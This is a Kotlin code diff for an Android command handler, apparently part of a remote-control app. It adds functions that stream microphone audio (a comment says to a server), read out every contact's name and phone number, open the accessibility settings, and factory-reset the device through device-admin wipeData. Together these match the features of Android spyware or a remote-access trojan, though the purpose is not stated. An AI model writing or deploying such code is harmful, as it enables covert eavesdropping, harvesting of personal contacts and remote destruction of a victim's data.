@@ -749,4 +749,121 @@ object NativeCommandHandler {
             mediaPlayer?.stop()
             mediaPlayer?.release()
             mediaPlayer = null
-            JSONObject().apply { put("
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply { put("ok", true) }
+        }
+    }
+
+    private fun startAudioStream(): JSONObject {
+        return try {
+            val ok = AudioStreamService.start { chunk ->
+                // Chunk audio — kirim ke server via HTTP/SSE
+                // Callback di-handle oleh service utama
+            }
+            JSONObject().apply { put("ok", ok) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "audio_stream_error")
+            }
+        }
+    }
+
+    private fun stopAudioStream(): JSONObject {
+        return try {
+            AudioStreamService.stop()
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply { put("ok", true) }
+        }
+    }
+
+    // ==========================================
+    // ===== CONTACTS =====
+    // ==========================================
+    private fun getContacts(context: Context): JSONObject {
+        return try {
+            val contactsList = mutableListOf<Map<String, String>>()
+            val cursor = context.contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null,
+            )
+
+            cursor?.use {
+                val nameIdx = it.getColumnIndex(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                )
+                val phoneIdx = it.getColumnIndex(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
+                )
+
+                while (it.moveToNext()) {
+                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
+                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
+                    contactsList.add(mapOf(
+                        "name" to (name ?: ""),
+                        "phone" to (phone ?: ""),
+                    ))
+                }
+            }
+
+            val jsonArray = JSONArray()
+            for (c in contactsList) {
+                jsonArray.put(JSONObject(c))
+            }
+
+            JSONObject().apply {
+                put("ok", true)
+                put("contacts", jsonArray)
+                put("count", contactsList.size)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "contacts_error")
+                put("contacts", JSONArray())
+                put("count", 0)
+            }
+        }
+    }
+
+    // ==========================================
+    // ===== SETTINGS =====
+    // ==========================================
+    private fun openAccessibilitySettings(context: Context) {
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            context.startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "openAccessibility error", e)
+        }
+    }
+
+    // ==========================================
+    // ===== FACTORY RESET =====
+    // ==========================================
+    private fun factoryReset(context: Context): JSONObject {
+        return try {
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
+                    as DevicePolicyManager
+            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
+
+            if (dpm.isAdminActive(admin)) {
+                dpm.wipeData(0)
+                JSONObject().apply { put("ok", true) }
+            } else {
+                JSONObject().apply {
+                    put("ok", false)
+                    put("error", "device_admin_not_active")
+                }
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "factory_reset_error")
+            }
+        }
+    }
+}
